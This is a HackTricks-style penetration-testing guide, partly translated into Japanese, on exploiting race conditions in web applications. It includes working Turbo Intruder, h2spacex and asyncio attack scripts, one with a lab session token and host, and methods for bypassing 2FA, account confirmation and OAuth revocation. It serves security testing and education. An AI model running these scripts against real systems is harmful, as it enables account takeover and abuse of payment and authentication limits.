# Race Condition

{{#include ../banners/hacktricks-training.md}}

> [!WARNING]
> この手法を深く理解するには、オリジナルのレポート [https://portswigger.net/research/smashing-the-state-machine](https://portswigger.net/research/smashing-the-state-machine) を参照してください。

## Race Condition 攻撃の強化

Race Condition を悪用する際の主な障害は、複数のリクエストが「ほぼ同時」に処理されることを確実にすることです。処理時間の差が**非常に小さいこと—理想的には1ms未満**である必要があります。

ここではリクエスト同期のためのいくつかの手法を紹介します:

#### HTTP/2 Single-Packet Attack 対 HTTP/1.1 Last-Byte Synchronization

- **HTTP/2**: 単一のTCP接続上で2つのリクエストを送れるため、ネットワークジッタの影響を減らせます。しかし、サーバー側の挙動の違いにより、常に成功するrace conditionのエクスプロイトには2回のリクエストだけでは不十分な場合があります。
- **HTTP/1.1 'Last-Byte Sync'**: 20〜30件のリクエストの大部分を事前に送信し、小さな断片を保留しておき、それらをまとめて送ることでサーバーへの同時到達を実現します。

**Preparation for Last-Byte Sync** には以下が含まれます:

1. ヘッダとボディデータを最終バイトを除いて送信し、ストリームを終了しない。
2. 初回送信後に100ms待機する。
3. 最終フレームをバッチ処理するために、TCP_NODELAYを無効にしてNagleのアルゴリズムを利用する。
4. 接続をウォームアップするためにpingを送る。

保留していたフレームを続けて送信すると、それらが1つのパケットで到着するはずで、Wiresharkで確認できます。この方法は静的ファイルには適用されません。静的ファイルは通常RC攻撃には関与しないためです。

### サーバーアーキテクチャへの適応

ターゲットのアーキテクチャを理解することが重要です。フロントエンドのサーバーはリクエストを異なる経路でルーティングすることがあり、タイミングに影響を与えます。無害なリクエストによるサーバー側の事前接続ウォームアップは、リクエストのタイミングを均一化する可能性があります。

#### セッションベースのロック処理への対処

PHPのsession handlerのようなフレームワークはセッション単位でリクエストを直列化するため、脆弱性を覆い隠す可能性があります。各リクエストに異なるセッショントークンを使うことでこの問題を回避できます。

#### レートまたはリソース制限の回避

接続ウォームアップが効果を示さない場合、ダミーリクエストを大量に送ってwebサーバーのレートやリソース制限による遅延を意図的に引き起こすことで、single-packet attack を助け、race conditions を誘発しやすくすることがあります。

## 攻撃例

- **Tubo Intruder - HTTP2 single-packet attack (1 endpoint)**: リクエストを **Turbo intruder** に送ることができます（`Extensions` -> `Turbo Intruder` -> `Send to Turbo Intruder`）。リクエスト内でブルートフォースしたい値を **`%s`** に設定できます。例: `csrf=Bn9VQB8OyefIs3ShR2fPESR0FzzulI1d&username=carlos&password=%s`。その後、ドロップダウンから **`examples/race-single-packer-attack.py`** を選択します:

<figure><img src="../images/image (57).png" alt=""><figcaption></figcaption></figure>

もし**異なる値を送信する**場合、クリップボードからワードリストを読み込む以下のコードに変更できます:
```python
passwords = wordlists.clipboard
for password in passwords:
engine.queue(target.req, password, gate='race1')
```
> [!WARNING]
> ウェブが HTTP2 をサポートしていない（HTTP1.1 のみ）の場合、`Engine.BURP2` の代わりに `Engine.THREADED` または `Engine.BURP` を使用してください。

- **Tubo Intruder - HTTP2 single-packet attack (Several endpoints)**: 1つのエンドポイントにリクエストを送ってから他の複数のエンドポイントにリクエストを送って RCE を誘発する必要がある場合、`race-single-packet-attack.py` スクリプトを次のように変更できます:
```python
def queueRequests(target, wordlists):
engine = RequestEngine(endpoint=target.endpoint,
concurrentConnections=1,
engine=Engine.BURP2
)

# Hardcode the second request for the RC
confirmationReq = '''POST /confirm?token[]= HTTP/2
Host: 0a9c00370490e77e837419c4005900d0.web-security-academy.net
Cookie: phpsessionid=MpDEOYRvaNT1OAm0OtAsmLZ91iDfISLU
Content-Length: 0

'''

# For each attempt (20 in total) send 50 confirmation requests.
for attempt in range(20):
currentAttempt = str(attempt)
username = 'aUser' + currentAttempt

# queue a single registration request
engine.queue(target.req, username, gate=currentAttempt)

# queue 50 confirmation requests - note that this will probably sent in two separate packets
for i in range(50):
engine.queue(confirmationReq, gate=currentAttempt)

# send all the queued requests for this attempt
engine.openGate(currentAttempt)
```
- また、Burp Suite の新しい '**Send group in parallel**' オプションを使用した **Repeater** でも利用できます。
- For **limit-overrun** の場合は、グループに **same request 50 times** を追加するだけでよい。
- For **connection warming** の場合は、**group** の **beginning** に web server の非静的な部分への **requests** をいくつか **add** できます。
- For **delaying** the process **between** processing **one request and another** in a 2 substates steps の場合は、両方のリクエストの間に **add extra requests between** を挿入できます。
- For a **multi-endpoint** RC の場合は、まず **goes to the hidden state** へ送られる **request** を送り、続けてそれを **exploits the hidden state** する **50 requests** を直後に送ることができます。

<figure><img src="../images/image (58).png" alt=""><figcaption></figcaption></figure>

- **Automated python script**: このスクリプトの目的は、ユーザーのメールを変更しつつ、新しいメールの verification token が最終的に古いメールに届くまで継続的に検証することです（これはコード上で、メールを変更できるが verification が古い方に送信される RC が見られたためです。理由はメールを示す変数が最初のメールで既に初期化されていたためです）。\
受信メールに "objetivo" という単語が見つかった時点で、変更後のメールの verification token を受け取ったことが分かり、攻撃を終了します。
```python
# https://portswigger.net/web-security/race-conditions/lab-race-conditions-limit-overrun
# Script from victor to solve a HTB challenge
from h2spacex import H2OnTlsConnection
from time import sleep
from h2spacex import h2_frames
import requests

cookie="session=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MiwiZXhwIjoxNzEwMzA0MDY1LCJhbnRpQ1NSRlRva2VuIjoiNDJhMDg4NzItNjEwYS00OTY1LTk1NTMtMjJkN2IzYWExODI3In0.I-N93zbVOGZXV_FQQ8hqDMUrGr05G-6IIZkyPwSiiDg"

# change these headers

headersObjetivo= """accept: */*
content-type: application/x-www-form-urlencoded
Cookie: """+cookie+"""
Content-Length: 112
"""

bodyObjetivo = 'email=objetivo%40apexsurvive.htb&username=estes&fullName=test&antiCSRFToken=42a08872-610a-4965-9553-22d7b3aa1827'

headersVerification= """Content-Length: 1
Cookie: """+cookie+"""
"""
CSRF="42a08872-610a-4965-9553-22d7b3aa1827"

host = "94.237.56.46"
puerto =39697


url = "https://"+host+":"+str(puerto)+"/email/"

response = requests.get(url, verify=False)


while "objetivo" not in response.text:

urlDeleteMails = "https://"+host+":"+str(puerto)+"/email/deleteall/"

responseDeleteMails = requests.get(urlDeleteMails, verify=False)
#print(response.text)
# change this host name to new generated one

Headers = { "Cookie" : cookie, "content-type": "application/x-www-form-urlencoded" }
data="email=test%40email.htb&username=estes&fullName=test&antiCSRFToken="+CSRF
urlReset="https://"+host+":"+str(puerto)+"/challenge/api/profile"
responseReset = requests.post(urlReset, data=data, headers=Headers, verify=False)

print(responseReset.status_code)

h2_conn = H2OnTlsConnection(
hostname=host,
port_number=puerto
)

h2_conn.setup_connection()

try_num = 100

stream_ids_list = h2_conn.generate_stream_ids(number_of_streams=try_num)

all_headers_frames = []  # all headers frame + data frames which have not the last byte
all_data_frames = []  # all data frames which contain the last byte


for i in range(0, try_num):
last_data_frame_with_last_byte=''
if i == try_num/2:
header_frames_without_last_byte, last_data_frame_with_last_byte = h2_conn.create_single_packet_http2_post_request_frames(  # noqa: E501
method='POST',
headers_string=headersObjetivo,
scheme='https',
stream_id=stream_ids_list[i],
authority=host,
body=bodyObjetivo,
path='/challenge/api/profile'
)
else:
header_frames_without_last_byte, last_data_frame_with_last_byte = h2_conn.create_single_packet_http2_post_request_frames(
method='GET',
headers_string=headersVerification,
scheme='https',
stream_id=stream_ids_list[i],
authority=host,
body=".",
path='/challenge/api/sendVerification'
)

all_headers_frames.append(header_frames_without_last_byte)
all_data_frames.append(last_data_frame_with_last_byte)


# concatenate all headers bytes
temp_headers_bytes = b''
for h in all_headers_frames:
temp_headers_bytes += bytes(h)

# concatenate all data frames which have last byte
temp_data_bytes = b''
for d in all_data_frames:
temp_data_bytes += bytes(d)

h2_conn.send_bytes(temp_headers_bytes)

# wait some time
sleep(0.1)

# send ping frame to warm up connection
h2_conn.send_ping_frame()

# send remaining data frames
h2_conn.send_bytes(temp_data_bytes)

resp = h2_conn.read_response_from_socket(_timeout=3)
frame_parser = h2_frames.FrameParser(h2_connection=h2_conn)
frame_parser.add_frames(resp)
frame_parser.show_response_of_sent_requests()

print('---')

sleep(3)
h2_conn.close_connection()

response = requests.get(url, verify=False)
```
#### Turbo Intruder: エンジンとゲーティングのメモ

- エンジン選択: HTTP/2 ターゲットでは `Engine.BURP2` を使用して the single‑packet attack をトリガーする; HTTP/1.1 の last‑byte sync には `Engine.THREADED` または `Engine.BURP` にフォールバックする。
- `gate`/`openGate`: `gate='race1'`（または per‑attempt gates）で多数のコピーをキューに入れ、各リクエストの末尾を保留する；`openGate('race1')` がすべての末尾を同時にフラッシュし、ほぼ同時に到着させる。
- Diagnostics: Turbo Intruder の負のタイムスタンプは、サーバがリクエストの送信完了前に応答したことを示し、オーバーラップがあったことを証明する。これは true races では予期される。
- Connection warming: タイミングを安定させるために、まず ping や無害なリクエストを数回送る；最終フレームのバッチ化を促すために `TCP_NODELAY` をオプションで無効化する。


### Improving Single Packet Attack

In the original research it's explained that this attack has a limit of 1,500 bytes. However, in [**this post**](https://flatt.tech/research/posts/beyond-the-limit-expanding-single-packet-race-condition-with-first-sequence-sync/), it was explained how it's possible to extend the 1,500-byte limitation of the single packet attack to the **65,535 B window limitation of TCP by using IP layer fragmentation** (splitting a single packet into multiple IP packets) and sending them in different order, allowed to prevent reassembling the packet until all the fragments reached the server. This technique allowed the researcher to send 10,000 requests in about 166ms.

これにより、何百〜何千のパケットが同時に到着することを要する RC に対して攻撃がより信頼性を増す一方で、ソフトウェア側の制限もあり得る点に注意する。Apache、Nginx、Go といった一般的な HTTP サーバは `SETTINGS_MAX_CONCURRENT_STREAMS` をそれぞれ 100、128、250 に厳格に設定しているが、NodeJS や nghttp2 のように無制限のものもある。\
これは基本的に Apache が単一の TCP 接続から 100 の HTTP コネクションしか考慮しない（この RC 攻撃を制限する）ことを意味する。

You can find some examples using this tehcnique in the repo [https://github.com/Ry0taK/first-sequence-sync/tree/main](https://github.com/Ry0taK/first-sequence-sync/tree/main).

## Raw BF

Before the previous research these were some payloads used which just tried to send the packets as fast as possible to cause a RC.

- **Repeater:** Check the examples from the previous section.
- **Intruder**: **request** を **Intruder** に送り、**Options menu** 内で **number of threads** を **30** に設定し、ペイロードとして **Null payloads** を選択して **30** を生成する。
- **Turbo Intruder**
```python
def queueRequests(target, wordlists):
engine = RequestEngine(endpoint=target.endpoint,
concurrentConnections=5,
requestsPerConnection=1,
pipeline=False
)
a = ['Session=<session_id_1>','Session=<session_id_2>','Session=<session_id_3>']
for i in range(len(a)):
engine.queue(target.req,a[i], gate='race1')
# open TCP connections and send partial requests
engine.start(timeout=10)
engine.openGate('race1')
engine.complete(timeout=60)

def handleResponse(req, interesting):
table.add(req)
```
- **Python - asyncio**
```python
import asyncio
import httpx

async def use_code(client):
resp = await client.post(f'http://victim.com', cookies={"session": "asdasdasd"}, data={"code": "123123123"})
return resp.text

async def main():
async with httpx.AsyncClient() as client:
tasks = []
for _ in range(20): #20 times
tasks.append(asyncio.ensure_future(use_code(client)))

# Get responses
results = await asyncio.gather(*tasks, return_exceptions=True)

# Print results
for r in results:
print(r)

# Async2sync sleep
await asyncio.sleep(0.5)
print(results)

asyncio.run(main())
```
## **RC Methodology**

### Limit-overrun / TOCTOU

これは最も基本的なタイプの race condition で、**vulnerabilities** が、行為を行える回数を制限する場面に**appear**するものです。例えば、同じ割引コードをウェブストアで何度も使うようなケースです。非常に簡単な例は[**this report**](https://medium.com/@pravinponnusamy/race-condition-vulnerability-found-in-bug-bounty-program-573260454c43) や [**this bug**](https://hackerone.com/reports/759247)**.** にあります。

この種の攻撃には以下のようなバリエーションがあります：

- ギフトカードを複数回換金する
- 製品を複数回評価する
- アカウント残高を超える現金の引き出しや送金
- 単一の CAPTCHA 解答を再利用する
- anti-brute-force rate limit をバイパスする

### **Hidden substates**

複雑な race conditions を悪用するには、短時間だけ存在する隠れた（または**unintended machine substates**）状態とやり取りできる機会を利用することが多いです。アプローチは次の通りです：

1. **Identify Potential Hidden Substates**
- まず、user profiles や password reset processes のような重要なデータを変更または操作する endpoints を特定します。次の点に注目してください：
- **Storage**: クライアント側でデータを扱うものよりも、サーバー側の永続データを操作する endpoints を優先する。
- **Action**: 既存のデータを変更する操作は、新しいデータを追加する操作よりも exploitable な条件を作りやすい。
- **Keying**: 成功する攻撃は通常、同じ識別子（例: username や reset token）をキーにした操作が関与する。
2. **Conduct Initial Probing**
- 特定した endpoints に対して race condition 攻撃を試し、期待される結果からの逸脱を観察する。予期しないレスポンスやアプリケーションの挙動の変化は vulnerability の兆候となる。
3. **Demonstrate the Vulnerability**
- 攻撃を vulnerability を悪用するために必要な最小のリクエスト数（多くの場合は2つ）に絞り込む。このステップはタイミングが正確である必要があるため、複数回の試行や自動化が必要になることがある。

### Time Sensitive Attacks

リクエストのタイミングの精度は脆弱性を露呈させることがあり、特に timestamps のような予測可能な方法が security tokens に使われている場合に顕著です。例えば、password reset tokens を timestamps に基づいて生成していると、同時のリクエストで同一のトークンが発生し得ます。

**To Exploit:**

- single packet attack のような精密なタイミングを使って同時に password reset リクエストを行う。トークンが同一であれば vulnerability を示す。

**Example:**

- 同時に2つの password reset tokens をリクエストして比較する。トークンが一致すれば token generation に欠陥があることを示唆する。

**Check this** [**PortSwigger Lab**](https://portswigger.net/web-security/race-conditions/lab-race-conditions-exploiting-time-sensitive-vulnerabilities) **to try this.**

## Hidden substates case studies

### Pay & add an Item

この [**PortSwigger Lab**](https://portswigger.net/web-security/logic-flaws/examples/lab-logic-flaws-insufficient-workflow-validation) を確認して、ストアで **pay** してから **add an extra** アイテムを行い、そのアイテムの支払いが **won't need to pay for it** になる方法を見てください。

### Confirm other emails

アイデアは、**verify an email address and change it to a different one at the same time** を同時に行い、プラットフォームが新しいメールを正しく verify するかを確認することです。

### Change email to 2 emails addresses Cookie based

[**this research**](https://portswigger.net/research/smashing-the-state-machine) によると、Gitlab はこの方法で takeover の脆弱性がありうるとされています。というのも、**send** された **email verification token of one email to the other email** が起きる可能性があったためです。

**Check this** [**PortSwigger Lab**](https://portswigger.net/web-security/race-conditions/lab-race-conditions-single-endpoint) **to try this.**

### Hidden Database states / Confirmation Bypass

もし **2 different writes** が **database** 内に情報を **add** するために使われる場合、データベースには **only the first data has been written** という短い時間が存在します。例えば、ユーザを作成する際に **username** と **password** が **written** され、その後で新規アカウントを確認するための **token** が書き込まれるかもしれません。つまり、ある短時間の間は **token to confirm an account is null** という状態があり得ます。

したがって、**registering an account and sending several requests with an empty token** (`token=` or `token[]=` or any other variation) ですぐにアカウントを確認しようとすると、自分が control していないメールのアカウントを **confirm an account** できてしまう可能性があります。

**Check this** [**PortSwigger Lab**](https://portswigger.net/web-security/race-conditions/lab-race-conditions-partial-construction) **to try this.**

### Bypass 2FA

以下の pseudo-code は race condition に脆弱です。非常に短い時間の間に **2FA is not enforced** の状態で session が作成されるためです：
```python
session['userid'] = user.userid
if user.mfa_enabled:
session['enforce_mfa'] = True
# generate and send MFA code to user
# redirect browser to MFA code entry form
```
### OAuth2 の永続化

There are several [**OAUth providers**](https://en.wikipedia.org/wiki/List_of_OAuth_providers). これらのサービスではアプリケーションを作成し、プロバイダに登録されているユーザーを認証できます。そうするために、**client** は **permit your application** をして **OAUth provider** 内のいくつかのデータへアクセスする必要があります。\
ここまでは google/linkedin/github... などでよくあるログインと同じで、"_アプリケーション \<InsertCoolName> があなたの情報にアクセスしようとしています。許可しますか？_" のような画面が表示されます。

#### `authorization_code` における Race Condition

**問題** は、**承諾すると** 自動的に **`authorization_code`** が悪意あるアプリケーションへ送信されるときに発生します。次に、この **アプリケーションは OAUth サービスプロバイダにおける Race Condition を悪用して、`authorization_code` からあなたのアカウントに対して複数の AT/RT を生成します**（_Authentication Token/Refresh Token_）。基本的には、あなたがアプリにデータアクセスを許可したことを悪用して **複数のアカウントを作成** します。そうして、もしアプリへのアクセス許可を取り消しても、**一組の AT/RT は削除されるかもしれませんが、他のものは依然として有効なままです。**

#### `Refresh Token` における Race Condition

一度 **有効な RT を取得すると**、それを **悪用して複数の AT/RT を生成する** ことが可能です。そして、**ユーザーが権限を取り消したとしても**、**複数の RT が依然として有効なままになる** ことがあります。

## **RC in WebSockets**

- In [**WS_RaceCondition_PoC**](https://github.com/redrays-io/WS_RaceCondition_PoC) には、websocket メッセージを **parallel** に送信して Web Sockets における **Race Conditions** を悪用するための Java 製 PoC が含まれています。
- Burp の WebSocket Turbo Intruder では **THREADED** エンジンを使って複数の WS 接続を立ち上げ、ペイロードを並列に送信できます。公式の例から始めて `config()`（スレッド数）を調整して並行性を確保してください；WS ハンドラ間でサーバ側の状態をレースする場合、単一接続でのバッチ処理よりもこちらの方が信頼性が高いことが多いです。参照: [RaceConditionExample.py](https://github.com/d0ge/WebSocketTurboIntruder/blob/main/src/main/resources/examples/RaceConditionExample.py).

## 参考資料

- [https://hackerone.com/reports/759247](https://hackerone.com/reports/759247)
- [https://pandaonair.com/2020/06/11/race-conditions-exploring-the-possibilities.html](https://pandaonair.com/2020/06/11/race-conditions-exploring-the-possibilities.html)
- [https://hackerone.com/reports/55140](https://hackerone.com/reports/55140)
- [https://portswigger.net/research/smashing-the-state-machine](https://portswigger.net/research/smashing-the-state-machine)
- [https://portswigger.net/web-security/race-conditions](https://portswigger.net/web-security/race-conditions)
- [https://flatt.tech/research/posts/beyond-the-limit-expanding-single-packet-race-condition-with-first-sequence-sync/](https://flatt.tech/research/posts/beyond-the-limit-expanding-single-packet-race-condition-with-first-sequence-sync/)
- [WebSocket Turbo Intruder: Unearthing the WebSocket Goldmine](https://portswigger.net/research/websocket-turbo-intruder-unearthing-the-websocket-goldmine)
- [WebSocketTurboIntruder – GitHub](https://github.com/d0ge/WebSocketTurboIntruder)
- [RaceConditionExample.py](https://github.com/d0ge/WebSocketTurboIntruder/blob/main/src/main/resources/examples/RaceConditionExample.py)

{{#include ../banners/hacktricks-training.md}}
